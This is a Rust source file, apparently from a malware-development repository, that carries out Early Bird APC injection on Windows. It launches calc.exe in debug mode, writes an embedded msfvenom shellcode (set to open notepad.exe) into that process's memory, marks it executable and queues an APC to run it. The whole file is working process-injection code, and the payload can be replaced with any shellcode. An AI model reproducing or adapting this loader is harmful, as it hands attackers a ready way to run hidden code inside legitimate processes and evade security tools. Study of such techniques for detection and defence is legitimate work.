
/*
Early_Bird_APC_Injection
For more Codes: https://github.com/Whitecat18/Rust-for-Malware-Development.git
@5mukx
*/

use std::{ffi::CString, ptr::null_mut};
use winapi::ctypes::c_void;
use winapi::um::debugapi::DebugActiveProcessStop;
use winapi::um::handleapi::CloseHandle;
use winapi::um::memoryapi::{VirtualAllocEx, VirtualFreeEx, VirtualProtectEx, WriteProcessMemory};
use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use winapi::um::{
    errhandlingapi::GetLastError, 
    processthreadsapi::{CreateProcessA, QueueUserAPC ,CreateRemoteThread, PROCESS_INFORMATION, STARTUPINFOA}, 
    synchapi::SleepEx, winbase::INFINITE
};

macro_rules! okey {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\____[+] {}", format!($msg, $($arg),*));   
    }
}

macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\____[-] {}", format!($msg, $($arg), *));
        std::process::exit(0);
    }
}

unsafe extern "system" fn function(_content: *mut c_void) -> u32{
    SleepEx(INFINITE, 1);
    0
}
fn main(){
    println!("| Early_Bird_APC_Injection");
    // println!("|--------------------------");
    // notepad msfvenom -> msfvenom -p windows/x64/exec CMD=notepad.exe -f rust
    let buf: [u8; 279] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x6e, 0x6f, 0x74,
        0x65, 0x70, 0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];

    unsafe{
        // startup info ...
        let mut si: STARTUPINFOA = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOA> as u32;

        // process info ...
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let file_path = CString::new("C:\\Windows\\System32\\calc.exe").expect("Unable to convert into null terminated ansi string");

        let process = CreateProcessA(
            null_mut(),
            file_path.as_ptr() as *mut i8,
            null_mut(),
            null_mut(),
            0,
            0x00000001, 
            null_mut(), 
            null_mut(), 
            &mut si, 
            &mut pi
        );

        if process == 0 {
            error!("Unable to create Process : {}",GetLastError());
        }    

        okey!("Process Addr: {:#?}",process);

        let hprocess = pi.hProcess;
        okey!("HProcess: {:#?}",hprocess);

        let hthread = CreateRemoteThread(
            hprocess,
            null_mut(), 0,
            Some(function),
            null_mut(),
            0, 
            null_mut(),
        );

        if hthread.is_null(){
           error!("Unable to create thread at VAS : {}", GetLastError());
        }

        okey!("HThread: {:#?}",hthread);

        let address = VirtualAllocEx(
            hprocess,
            null_mut(),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if address.is_null(){
            error!("Unable to allocate memory to VAS: {}", GetLastError());
        }
        
        okey!("VirtualAddress: {:#?}",address);

        let process_mem = WriteProcessMemory(
            hprocess,
            address,
            buf.as_ptr() as _,
            buf.len(),
            null_mut(),
        );

        okey!("Process_mem: {:#?}",process_mem);

        let mut oldprotect:u32 = 0;

        let virtual_protect = VirtualProtectEx(
            hprocess,
            address,
            buf.len(),
            PAGE_EXECUTE_READWRITE,
            &mut oldprotect,
        );
        
        if virtual_protect == 0{
            error!("VirtualProtectEx failed : {:#?}",virtual_protect);
        }

        // Creating an remote thread

        // let thread_start_routine = buf as LPTHREAD_START_ROUTINE;
        // let thread_start: LPTHREAD_START_ROUTINE = Some(thread_start_routine);

        // let remote_thread = CreateRemoteThread(
        //     hprocess, 
        //     null_mut(), 
        //  _thread_start, 
        //     thread_start,
        //     address, 
        //     0, 
        //     null_mut()
        // );

        // if remote_thread.is_null(){
        //     error!("Unable to create Remote Thread: {:#?}",GetLastError());
        // }

        let queue = QueueUserAPC(
            std::mem::transmute(address), 
            hthread, 
            0
        );

        okey!("Queue Addr: {:#?}",queue);

        
        // if ResumeThread(remote_thread) == 0{
        //     error!("ResumeThread Failed: {:#?}",remote_thread);
        // }
        
        DebugActiveProcessStop(pi.dwProcessId);
        // CloseHandle(remote_thread);
        CloseHandle(hprocess);
        CloseHandle(hthread);

        VirtualFreeEx(hprocess,
            address, 
            0, 
            MEM_RELEASE
        );
    }
}
